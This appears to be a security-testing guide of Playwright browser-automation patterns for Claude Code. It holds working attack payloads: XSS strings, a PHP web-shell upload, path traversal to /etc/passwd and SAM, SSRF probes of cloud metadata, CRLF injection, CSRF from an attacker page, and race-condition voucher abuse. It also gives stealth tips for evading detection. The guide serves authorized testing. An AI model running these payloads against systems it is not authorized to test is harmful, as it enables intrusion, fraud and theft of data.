# Playwright Security Testing Patterns

## Overview

This guide provides specific Playwright patterns for security testing. Playwright MCP integration in Claude Code enables powerful browser automation for comprehensive DAST.

## Core Playwright Security Patterns

### Pattern 1: XSS Detection with Playwright

**Objective:** Inject XSS payloads and verify execution

```markdown
## XSS Testing Pattern

For each input field:
1. Navigate to target page
2. Inject XSS payload
3. Submit form
4. Detect payload execution

Playwright Implementation (Claude Code orchestrates):

# Navigate to page
await page.goto(targetUrl)

# Fill input with XSS payload
await page.fill('#input-field', '<script>alert(document.domain)</script>')

# Submit form
await page.click('button[type="submit"]')

# Method 1: Detect alert dialog
page.on('dialog', async dialog => {
    console.log('[+] XSS DETECTED: Alert triggered')
    await dialog.dismiss()
})

# Method 2: Check DOM for unescaped payload
const content = await page.content()
if (content.includes('<script>alert(document.domain)</script>')) {
    console.log('[+] XSS DETECTED: Unescaped payload in DOM')
}

# Method 3: Check for payload execution via window property
const xssDetected = await page.evaluate(() => {
    return window.xssExecuted === true
})
```

**Advanced XSS Detection:**

```markdown
## DOM-based XSS Testing

# Test URL fragment-based XSS
await page.goto(targetUrl + '#<img src=x onerror=alert(1)>')

# Monitor for DOM manipulation
const xssExecuted = await page.evaluate(() => {
    // Check if malicious script executed
    return document.body.innerHTML.includes('onerror=alert(1)')
})

## Stored XSS Testing

# Step 1: Submit XSS payload
await page.goto(submitUrl)
await page.fill('#comment', '<script>alert("Stored XSS")</script>')
await page.click('button[type="submit"]')

# Step 2: Navigate to page where stored data displayed
await page.goto(displayUrl)

# Step 3: Check for execution
page.on('dialog', dialog => {
    console.log('[+] STORED XSS DETECTED')
})

await page.waitForTimeout(2000)  # Wait for potential execution
```

### Pattern 2: CSRF Testing with Playwright

**Objective:** Verify CSRF protection on state-changing operations

```markdown
## CSRF Testing Pattern

# Step 1: Capture legitimate request
const requestData = await page.evaluate(() => {
    const form = document.querySelector('form')
    return {
        action: form.action,
        method: form.method,
        csrfToken: document.querySelector('input[name="csrf_token"]')?.value
    }
})

# Step 2: Create new browser context (different origin)
const attackerContext = await browser.newContext()
const attackerPage = await attackerContext.newPage()

# Step 3: Attempt CSRF without token
await attackerPage.goto('https://attacker.com/csrf.html')

# Step 4: Submit cross-origin request (simulated)
const csrfSuccessful = await attackerPage.evaluate(async (data) => {
    const response = await fetch(data.action, {
        method: data.method,
        body: new FormData(document.querySelector('form')),
        credentials: 'include'  # Include cookies
    })
    return response.ok
}, requestData)

if (csrfSuccessful) {
    console.log('[+] CSRF VULNERABILITY DETECTED')
}
```

**Token Validation Testing:**

```markdown
## Test CSRF Token Validation

# Test 1: No token
await page.evaluate((action) => {
    fetch(action, {
        method: 'POST',
        body: 'action=delete',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'}
    })
}, formAction)

# Test 2: Empty token
await page.fill('input[name="csrf_token"]', '')
await page.click('button[type="submit"]')

# Test 3: Invalid token
await page.fill('input[name="csrf_token"]', 'invalid_token_12345')
await page.click('button[type="submit"]')

# Test 4: Token from different session
await page.fill('input[name="csrf_token"]', stolenToken)
await page.click('button[type="submit"]')

# Verify: All should fail if properly protected
```

### Pattern 3: Authentication & Session Testing

**Objective:** Test authentication security and session management

```markdown
## Authentication Testing Pattern

# Step 1: Automated login
await page.goto(loginUrl)
await page.fill('#username', testUsername)
await page.fill('#password', testPassword)
await page.click('button[type="submit"]')

# Wait for authentication
await page.waitForNavigation()

# Verify successful login
const authenticated = await page.evaluate(() => {
    return document.querySelector('.user-profile') !== null
})

# Step 2: Capture session cookies
const cookies = await context.cookies()
const sessionCookie = cookies.find(c => c.name === 'session')

## Session Security Testing

# Test 1: Check HttpOnly flag
if (!sessionCookie.httpOnly) {
    console.log('[+] VULNERABILITY: Session cookie not HttpOnly')
}

# Test 2: Check Secure flag
if (!sessionCookie.secure) {
    console.log('[+] VULNERABILITY: Session cookie not Secure')
}

# Test 3: Check SameSite attribute
if (!sessionCookie.sameSite || sessionCookie.sameSite === 'None') {
    console.log('[+] VULNERABILITY: SameSite not set properly')
}

## Session Timeout Testing

# Capture initial session
const initialCookies = await context.cookies()

# Wait for timeout period
await page.waitForTimeout(1800000)  # 30 minutes

# Attempt authenticated action
await page.goto(authenticatedUrl)

# Verify session expired
const stillAuthenticated = await page.evaluate(() => {
    return document.querySelector('.user-profile') !== null
})

if (stillAuthenticated) {
    console.log('[+] VULNERABILITY: Session not expiring')
}

## Concurrent Session Testing

# Context 1: Login user
const context1 = await browser.newContext()
const page1 = await context1.newPage()
await loginUser(page1, username, password)
const session1 = await context1.cookies()

# Context 2: Login same user again
const context2 = await browser.newContext()
const page2 = await context2.newPage()
await loginUser(page2, username, password)
const session2 = await context2.cookies()

# Test if first session still valid
await page1.reload()
const session1Valid = await page1.evaluate(() => {
    return document.querySelector('.user-profile') !== null
})

if (session1Valid) {
    console.log('[+] VULNERABILITY: Concurrent sessions allowed')
}
```

### Pattern 4: IDOR Testing (Greybox)

**Objective:** Test for Insecure Direct Object References

```markdown
## IDOR Testing Pattern

# Step 1: Login as User A
const contextA = await browser.newContext()
const pageA = await contextA.newPage()
await loginUser(pageA, userA.username, userA.password)

# Step 2: Access User A's resource and capture ID
await pageA.goto('https://app.com/profile')
const userAId = await pageA.evaluate(() => {
    return document.querySelector('[data-user-id]').getAttribute('data-user-id')
})
console.log(`User A ID: ${userAId}`)

# Step 3: Login as User B
const contextB = await browser.newContext()
const pageB = await contextB.newPage()
await loginUser(pageB, userB.username, userB.password)

# Step 4: Attempt to access User A's resource
await pageB.goto(`https://app.com/api/user/${userAId}/profile`)

# Step 5: Check if access allowed
const response = await pageB.evaluate(() => {
    return document.body.textContent
})

if (response.includes(userA.email) || response.includes(userA.name)) {
    console.log('[+] IDOR VULNERABILITY DETECTED: User B accessed User A data')
}

## Sequential ID Testing

# Test multiple IDs for unauthorized access
for (let id = 1; id <= 1000; id++) {
    await pageB.goto(`https://app.com/api/document/${id}`)

    const accessible = await pageB.evaluate(() => {
        return !document.body.textContent.includes('Access Denied')
    })

    if (accessible) {
        console.log(`[+] IDOR: Document ${id} accessible to unauthorized user`)
    }
}
```

### Pattern 5: Business Logic Testing

**Objective:** Test multi-step workflows for logic flaws

```markdown
## Workflow Bypass Testing

# Normal checkout flow:
# 1. Add items to cart
# 2. Enter shipping info
# 3. Enter payment info
# 4. Review order
# 5. Confirm purchase

# Test: Skip payment step
await page.goto('https://shop.com/checkout/step1')
await addItemsToCart(page)

await page.goto('https://shop.com/checkout/step2')
await enterShippingInfo(page)

# Skip step 3 (payment) - directly go to confirmation
await page.goto('https://shop.com/checkout/confirm')
await page.click('#confirm-order')

# Verify if order placed without payment
const orderPlaced = await page.evaluate(() => {
    return document.body.textContent.includes('Order Confirmed')
})

if (orderPlaced) {
    console.log('[+] BUSINESS LOGIC FLAW: Payment step bypassed')
}

## Price Manipulation Testing

# Test negative quantity
await page.fill('#quantity', '-10')
await page.click('#add-to-cart')

# Test zero price
await page.evaluate(() => {
    document.querySelector('#price').value = '0'
})
await page.click('#checkout')

# Test MAX_INT overflow
await page.fill('#quantity', '2147483647')

## Race Condition Testing

# Exploit race condition in voucher application
const promises = []
for (let i = 0; i < 10; i++) {
    promises.push(
        page.evaluate(() => {
            fetch('/api/apply-voucher', {
                method: 'POST',
                body: JSON.stringify({code: 'DISCOUNT50'}),
                headers: {'Content-Type': 'application/json'}
            })
        })
    )
}

# Send all requests simultaneously
await Promise.all(promises)

# Check if voucher applied multiple times
const balance = await page.evaluate(() => {
    return parseFloat(document.querySelector('#balance').textContent)
})

if (balance < 0) {
    console.log('[+] RACE CONDITION: Voucher applied multiple times')
}
```

### Pattern 6: File Upload Testing

**Objective:** Test file upload security

```markdown
## File Upload Vulnerability Testing

# Test 1: Malicious file extension
await page.setInputFiles('#file-upload', {
    name: 'shell.php',
    mimeType: 'application/x-php',
    buffer: Buffer.from('<?php system($_GET["cmd"]); ?>')
})
await page.click('#upload-button')

# Verify if file accessible
const uploadedUrl = await page.evaluate(() => {
    return document.querySelector('.upload-success').textContent
})

await page.goto(uploadedUrl)
const executed = await page.content()
if (!executed.includes('<?php')) {
    console.log('[+] FILE UPLOAD VULNERABILITY: PHP executed')
}

# Test 2: Double extension bypass
await page.setInputFiles('#file-upload', {
    name: 'image.php.jpg',
    mimeType: 'image/jpeg',
    buffer: Buffer.from('<?php system($_GET["cmd"]); ?>')
})

# Test 3: MIME type mismatch
await page.setInputFiles('#file-upload', {
    name: 'image.jpg',
    mimeType: 'image/jpeg',
    buffer: Buffer.from('<?php system($_GET["cmd"]); ?>')  # PHP content
})

# Test 4: Path traversal
await page.setInputFiles('#file-upload', {
    name: '../../../etc/passwd',
    mimeType: 'text/plain',
    buffer: Buffer.from('test')
})
```

### Pattern 7: API Testing with Network Monitoring

**Objective:** Monitor and test API requests

```markdown
## API Request Monitoring

# Intercept all API requests
const apiCalls = []

page.on('request', request => {
    if (request.url().includes('/api/')) {
        apiCalls.push({
            url: request.url(),
            method: request.method(),
            headers: request.headers(),
            postData: request.postData()
        })
    }
})

# Navigate and interact with app
await page.goto(targetUrl)
await page.click('.load-data')
await page.waitForTimeout(2000)

# Analyze collected API calls
for (const call of apiCalls) {
    console.log(`API: ${call.method} ${call.url}`)

    # Test each API endpoint
    # - Parameter tampering
    # - Authorization bypass
    # - Injection attacks
}

## API Request Modification

# Modify API request on-the-fly
await page.route('/api/**', route => {
    const request = route.request()

    # Modify request (e.g., change user ID)
    const postData = JSON.parse(request.postData())
    postData.userId = 'admin'  # Privilege escalation attempt

    route.continue({
        postData: JSON.stringify(postData)
    })
})

# Trigger API call
await page.click('#submit')

# Verify if privilege escalation successful
```

### Pattern 8: JavaScript Analysis

**Objective:** Analyze client-side JavaScript for vulnerabilities

```markdown
## Extract and Analyze JavaScript

# Get all script sources
const scripts = await page.evaluate(() => {
    const scriptElements = document.querySelectorAll('script')
    return Array.from(scriptElements).map(s => ({
        src: s.src,
        inline: s.innerHTML
    }))
})

# Check for sensitive data in JS
for (const script of scripts) {
    if (script.inline) {
        if (script.inline.includes('apiKey') ||
            script.inline.includes('password') ||
            script.inline.includes('secret')) {
            console.log('[+] SENSITIVE DATA IN JAVASCRIPT')
        }
    }
}

## DOM XSS Testing

# Check for dangerous sinks
const dangerousSinks = await page.evaluate(() => {
    const code = document.documentElement.innerHTML
    const sinks = [
        'innerHTML', 'outerHTML', 'eval(', 'setTimeout(',
        'setInterval(', 'document.write(', 'location.href'
    ]

    const found = []
    for (const sink of sinks) {
        if (code.includes(sink)) {
            found.push(sink)
        }
    }
    return found
})

if (dangerousSinks.length > 0) {
    console.log(`[+] POTENTIAL DOM XSS: Found sinks: ${dangerousSinks.join(', ')}`)
}
```

## Testing Efficiency Patterns

### Parallel Testing

```markdown
# Test multiple payloads in parallel
const payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>'
]

const tests = payloads.map(async payload => {
    const context = await browser.newContext()
    const page = await context.newPage()

    await page.goto(targetUrl)
    await page.fill('#input', payload)
    await page.click('#submit')

    const vulnerable = await detectXSS(page, payload)
    await context.close()

    return { payload, vulnerable }
})

const results = await Promise.all(tests)
```

### Stealth Testing

```markdown
# Randomize user agents
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)...',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...',
    # ... more user agents
]

const context = await browser.newContext({
    userAgent: userAgents[Math.floor(Math.random() * userAgents.length)]
})

# Add random delays
async function randomDelay() {
    const delay = Math.floor(Math.random() * 2000) + 1000  # 1-3 seconds
    await page.waitForTimeout(delay)
}

await page.goto(targetUrl)
await randomDelay()
await page.click('#button1')
await randomDelay()
```

## Best Practices

### 1. Context Management
```markdown
- Create new context per user/session
- Clean up contexts after use: await context.close()
- Isolate tests to prevent interference
```

### 2. Error Handling
```markdown
try {
    await page.goto(targetUrl, { timeout: 30000 })
} catch (error) {
    console.log(`Failed to load: ${error.message}`)
    # Continue testing or skip
}
```

### 3. Evidence Collection
```markdown
# Take screenshots for findings
if (vulnerabilityDetected) {
    await page.screenshot({
        path: `evidence/xss_${timestamp}.png`,
        fullPage: true
    })
}

# Capture network logs
const networkLog = []
page.on('response', response => {
    networkLog.push({
        url: response.url(),
        status: response.status(),
        headers: response.headers()
    })
})
```

### 4. Resource Cleanup
```markdown
# Always clean up resources
try {
    # ... testing code ...
} finally {
    if (context) await context.close()
    if (browser) await browser.close()
}
```

## Advanced Security Testing Patterns (from HackerOne Analysis)

### Pattern 9: SSRF Detection via Network Monitoring

```javascript
// Monitor for internal/cloud metadata requests
const ssrfIndicators = [];

page.on('request', request => {
  const url = request.url();

  // Check for cloud metadata access
  if (url.includes('169.254.169.254') ||
      url.includes('metadata.google.internal') ||
      url.includes('127.0.0.1') ||
      url.includes('localhost') ||
      url.includes('[::1]')) {
    ssrfIndicators.push({
      type: 'SSRF_DETECTED',
      url: url,
      initiator: request.frame().url()
    });
  }
});

// Test SSRF in URL parameters
const ssrfPayloads = [
  'http://169.254.169.254/latest/meta-data/',
  'http://127.0.0.1:22',
  'http://[::1]/',
  'http://0x7f000001/',
  'http://2130706433/'
];

for (const payload of ssrfPayloads) {
  await page.goto(`${targetUrl}?url=${encodeURIComponent(payload)}`);
  // Check response for internal data
}
```

### Pattern 10: Business Logic Race Condition Testing

```javascript
// Race condition exploitation with parallel requests
async function testRaceCondition(page, endpoint, payload, count = 20) {
  const results = await Promise.all(
    Array(count).fill().map(() =>
      page.evaluate(async (url, data) => {
        const start = performance.now();
        const response = await fetch(url, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify(data),
          credentials: 'include'
        });
        return {
          status: response.status,
          time: performance.now() - start,
          body: await response.text()
        };
      }, endpoint, payload)
    )
  );

  // Analyze for race condition
  const successes = results.filter(r => r.status === 200);
  return {
    vulnerable: successes.length > 1,
    successCount: successes.length,
    results: results
  };
}

// Test voucher double-spend
const raceResult = await testRaceCondition(
  page,
  'https://target.com/api/apply-voucher',
  {code: 'DISCOUNT50'},
  20
);

if (raceResult.vulnerable) {
  console.log(`[+] RACE CONDITION: Voucher applied ${raceResult.successCount} times`);
}
```

### Pattern 11: JWT Token Manipulation

```javascript
// Extract and analyze JWT tokens
async function analyzeJWT(page) {
  const cookies = await page.context().cookies();
  const localStorage = await page.evaluate(() => {
    return Object.entries(localStorage).filter(([k,v]) =>
      v.includes('eyJ') // Base64 JWT prefix
    );
  });

  // Find JWT tokens
  const tokens = [];

  for (const cookie of cookies) {
    if (cookie.value.includes('eyJ') || cookie.value.split('.').length === 3) {
      tokens.push({source: 'cookie', name: cookie.name, value: cookie.value});
    }
  }

  for (const [key, value] of localStorage) {
    if (value.split('.').length === 3) {
      tokens.push({source: 'localStorage', name: key, value: value});
    }
  }

  // Decode and analyze each token
  for (const token of tokens) {
    try {
      const parts = token.value.split('.');
      const header = JSON.parse(atob(parts[0]));
      const payload = JSON.parse(atob(parts[1]));

      token.decoded = {header, payload};
      token.vulnerabilities = [];

      // Check for weak algorithms
      if (header.alg === 'none' || header.alg === 'HS256') {
        token.vulnerabilities.push('WEAK_ALGORITHM');
      }

      // Check for kid header (potential traversal)
      if (header.kid) {
        token.vulnerabilities.push('KID_HEADER_PRESENT');
      }

      // Check for expired token still working
      if (payload.exp && payload.exp < Date.now() / 1000) {
        token.vulnerabilities.push('EXPIRED_TOKEN_ACCEPTED');
      }
    } catch (e) {
      // Not a valid JWT
    }
  }

  return tokens;
}
```

### Pattern 12: IDOR Comprehensive Testing

```javascript
// Automated IDOR testing across all discovered endpoints
async function comprehensiveIDORTest(page, endpoints, userASession, userBSession) {
  const idorVulnerabilities = [];

  for (const endpoint of endpoints) {
    // Extract ID patterns from endpoint
    const idMatches = endpoint.match(/\/(\d+)|\/([a-f0-9-]{36})/gi);

    if (!idMatches) continue;

    // Login as User A, capture resources
    const contextA = await browser.newContext();
    const pageA = await contextA.newPage();
    await pageA.context().addCookies([userASession]);

    const responseA = await pageA.goto(endpoint);
    const contentA = await pageA.content();

    // Login as User B, try to access User A's resources
    const contextB = await browser.newContext();
    const pageB = await contextB.newPage();
    await pageB.context().addCookies([userBSession]);

    const responseB = await pageB.goto(endpoint);
    const contentB = await pageB.content();

    // Check if User B can access User A's data
    if (responseB.status() === 200 && !contentB.includes('Access Denied')) {
      // Compare content - if similar, potential IDOR
      const similarity = calculateSimilarity(contentA, contentB);
      if (similarity > 0.8) {
        idorVulnerabilities.push({
          endpoint: endpoint,
          severity: 'HIGH',
          type: 'IDOR',
          evidence: contentB.substring(0, 500)
        });
      }
    }

    await contextA.close();
    await contextB.close();
  }

  return idorVulnerabilities;
}
```

### Pattern 13: Stored XSS Detection Chain

```javascript
// Multi-step stored XSS detection
async function detectStoredXSS(page, submitUrl, displayUrl, inputSelector) {
  const xssPayloads = [
    '<script>window.xssExecuted=true</script>',
    '<img src=x onerror="window.xssExecuted=true">',
    '<svg onload="window.xssExecuted=true">',
    '"><script>window.xssExecuted=true</script><"',
    "'-alert(1)-'"
  ];

  const vulnerabilities = [];

  for (const payload of xssPayloads) {
    // Step 1: Submit payload
    await page.goto(submitUrl);
    await page.fill(inputSelector, payload);
    await page.click('button[type="submit"]');

    // Wait for submission
    await page.waitForNavigation({waitUntil: 'networkidle'});

    // Step 2: Navigate to display page
    await page.goto(displayUrl);

    // Step 3: Check for execution
    const executed = await page.evaluate(() => window.xssExecuted === true);

    if (executed) {
      vulnerabilities.push({
        type: 'STORED_XSS',
        payload: payload,
        submitUrl: submitUrl,
        displayUrl: displayUrl,
        severity: 'HIGH'
      });

      // Take screenshot evidence
      await page.screenshot({path: `evidence/stored_xss_${Date.now()}.png`});
    }

    // Reset
    await page.evaluate(() => delete window.xssExecuted);
  }

  return vulnerabilities;
}
```

### Pattern 14: Path Traversal Testing

```javascript
// Test path traversal on file parameters
async function testPathTraversal(page, baseUrl, fileParam) {
  const traversalPayloads = [
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    '..%2f..%2f..%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '/etc/passwd',
    '....\\....\\....\\windows\\system32\\config\\SAM'
  ];

  const indicators = ['root:', 'nobody:', 'daemon:', '[boot loader]'];
  const vulnerabilities = [];

  for (const payload of traversalPayloads) {
    const testUrl = `${baseUrl}?${fileParam}=${encodeURIComponent(payload)}`;

    await page.goto(testUrl);
    const content = await page.content();

    for (const indicator of indicators) {
      if (content.includes(indicator)) {
        vulnerabilities.push({
          type: 'PATH_TRAVERSAL',
          payload: payload,
          url: testUrl,
          indicator: indicator,
          severity: 'CRITICAL'
        });
        break;
      }
    }
  }

  return vulnerabilities;
}
```

### Pattern 15: GraphQL Introspection and Attack

```javascript
// GraphQL security testing
async function testGraphQLSecurity(page, graphqlEndpoint) {
  const findings = [];

  // Test introspection (should be disabled in production)
  const introspectionQuery = `{
    __schema {
      types { name fields { name type { name } } }
    }
  }`;

  const introspectionResult = await page.evaluate(async (url, query) => {
    const response = await fetch(url, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({query})
    });
    return response.json();
  }, graphqlEndpoint, introspectionQuery);

  if (introspectionResult.data?.__schema) {
    findings.push({
      type: 'GRAPHQL_INTROSPECTION_ENABLED',
      severity: 'MEDIUM',
      data: introspectionResult.data
    });

    // Extract all types and fields for further testing
    const types = introspectionResult.data.__schema.types;

    // Look for sensitive fields
    const sensitivePatterns = ['password', 'secret', 'token', 'key', 'credit', 'ssn'];
    for (const type of types) {
      if (type.fields) {
        for (const field of type.fields) {
          if (sensitivePatterns.some(p => field.name.toLowerCase().includes(p))) {
            findings.push({
              type: 'GRAPHQL_SENSITIVE_FIELD',
              severity: 'HIGH',
              typeName: type.name,
              fieldName: field.name
            });
          }
        }
      }
    }
  }

  // Test query depth limit
  const deepQuery = `{
    users { posts { author { posts { author { posts { title } } } } } }
  }`;

  const depthResult = await page.evaluate(async (url, query) => {
    const response = await fetch(url, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({query})
    });
    return {status: response.status, body: await response.text()};
  }, graphqlEndpoint, deepQuery);

  if (depthResult.status === 200) {
    findings.push({
      type: 'GRAPHQL_NO_DEPTH_LIMIT',
      severity: 'MEDIUM',
      description: 'Deep queries allowed - potential DoS'
    });
  }

  return findings;
}
```

### Pattern 16: CSRF Token Bypass Testing

```javascript
// Comprehensive CSRF bypass testing
async function testCSRFBypass(page, formUrl, targetAction) {
  const bypassTests = [];

  // Get original form with CSRF token
  await page.goto(formUrl);
  const originalToken = await page.evaluate(() => {
    const csrfInput = document.querySelector('input[name*="csrf"], input[name*="token"]');
    return csrfInput ? csrfInput.value : null;
  });

  const testCases = [
    {name: 'No token', token: ''},
    {name: 'Removed token', token: null},
    {name: 'Invalid token', token: 'invalid_token_12345'},
    {name: 'Truncated token', token: originalToken?.substring(0, 10)},
    {name: 'Similar token', token: originalToken?.replace(/.$/, 'X')}
  ];

  for (const testCase of testCases) {
    // Create new context (different origin simulation)
    const attackerContext = await browser.newContext();
    const attackerPage = await attackerContext.newPage();

    // Attempt CSRF
    const result = await attackerPage.evaluate(async (action, token, tokenName) => {
      const formData = new FormData();
      formData.append('action', 'sensitive_action');
      if (token !== null) {
        formData.append(tokenName || '_csrf', token);
      }

      try {
        const response = await fetch(action, {
          method: 'POST',
          body: formData,
          credentials: 'include'
        });
        return {success: response.ok, status: response.status};
      } catch (e) {
        return {success: false, error: e.message};
      }
    }, targetAction, testCase.token, 'csrf_token');

    bypassTests.push({
      test: testCase.name,
      result: result,
      vulnerable: result.success
    });

    await attackerContext.close();
  }

  return bypassTests;
}
```

### Pattern 17: HTTP Header Injection

```javascript
// Test for CRLF/Header injection
async function testHeaderInjection(page, targetUrl, param) {
  const injectionPayloads = [
    'test%0d%0aX-Injected-Header:%20attack',
    'test%0aSet-Cookie:%20admin=true',
    'test%0d%0a%0d%0a<script>alert(1)</script>',
    'test\r\nX-Forwarded-For: 127.0.0.1'
  ];

  const vulnerabilities = [];

  for (const payload of injectionPayloads) {
    const testUrl = `${targetUrl}?${param}=${payload}`;

    const response = await page.goto(testUrl);
    const headers = response.headers();

    // Check if injected headers appear
    if (headers['x-injected-header'] ||
        headers['set-cookie']?.includes('admin=true')) {
      vulnerabilities.push({
        type: 'CRLF_INJECTION',
        payload: payload,
        severity: 'HIGH',
        injectedHeaders: headers
      });
    }

    // Check for HTTP response splitting
    const content = await page.content();
    if (content.includes('<script>alert(1)</script>')) {
      vulnerabilities.push({
        type: 'HTTP_RESPONSE_SPLITTING',
        payload: payload,
        severity: 'CRITICAL'
      });
    }
  }

  return vulnerabilities;
}
```

### Pattern 18: Subdomain Takeover Detection

```javascript
// Check for subdomain takeover indicators
async function checkSubdomainTakeover(page, subdomain) {
  const takeoverIndicators = {
    'herokuapp.com': ['There is no app configured at that hostname', 'No such app'],
    's3.amazonaws.com': ['NoSuchBucket', 'The specified bucket does not exist'],
    'github.io': ['There isn\'t a GitHub Pages site here'],
    'azurewebsites.net': ['Error 404 - Web app not found'],
    'cloudfront.net': ['Bad Request', 'The request could not be satisfied'],
    'shopify.com': ['Sorry, this shop is currently unavailable'],
    'zendesk.com': ['Help Center Closed'],
    'ghost.io': ['The thing you were looking for is no longer here']
  };

  try {
    const response = await page.goto(`https://${subdomain}`, {
      timeout: 10000,
      waitUntil: 'domcontentloaded'
    });

    const content = await page.content();

    for (const [service, indicators] of Object.entries(takeoverIndicators)) {
      for (const indicator of indicators) {
        if (content.includes(indicator)) {
          return {
            vulnerable: true,
            subdomain: subdomain,
            service: service,
            indicator: indicator,
            severity: 'HIGH'
          };
        }
      }
    }

    return {vulnerable: false, subdomain: subdomain};
  } catch (e) {
    // Connection error might indicate dangling DNS
    return {
      vulnerable: 'POTENTIAL',
      subdomain: subdomain,
      error: e.message
    };
  }
}
```

## Evidence Collection Best Practices

```javascript
// Comprehensive evidence collection for findings
async function collectEvidence(page, finding) {
  const timestamp = Date.now();
  const evidence = {
    timestamp: new Date().toISOString(),
    finding: finding,
    url: page.url(),
    screenshots: [],
    networkLogs: [],
    consoleMessages: []
  };

  // Take full page screenshot
  const screenshotPath = `evidence/${finding.type}_${timestamp}.png`;
  await page.screenshot({path: screenshotPath, fullPage: true});
  evidence.screenshots.push(screenshotPath);

  // Capture DOM state
  evidence.domSnapshot = await page.content();

  // Capture cookies and storage
  evidence.cookies = await page.context().cookies();
  evidence.localStorage = await page.evaluate(() => ({...localStorage}));
  evidence.sessionStorage = await page.evaluate(() => ({...sessionStorage}));

  // Save evidence to JSON
  const evidenceFile = `evidence/${finding.type}_${timestamp}.json`;
  fs.writeFileSync(evidenceFile, JSON.stringify(evidence, null, 2));

  return evidence;
}
```

## Conclusion

Playwright provides powerful capabilities for security testing:
- JavaScript-aware testing for SPAs
- Network request interception and modification
- Multiple browser contexts for isolation
- Comprehensive DOM access
- Screenshot and evidence collection
- Race condition testing via parallel execution
- Session manipulation across contexts

**Key HackerOne Patterns Integrated:**
- IDOR testing with multi-user session handling
- Business logic race conditions
- JWT token analysis and manipulation
- GraphQL introspection and attack patterns
- CRLF/Header injection
- Subdomain takeover detection
- Comprehensive evidence collection

Use these patterns with Claude Code's Playwright MCP integration for effective DAST.
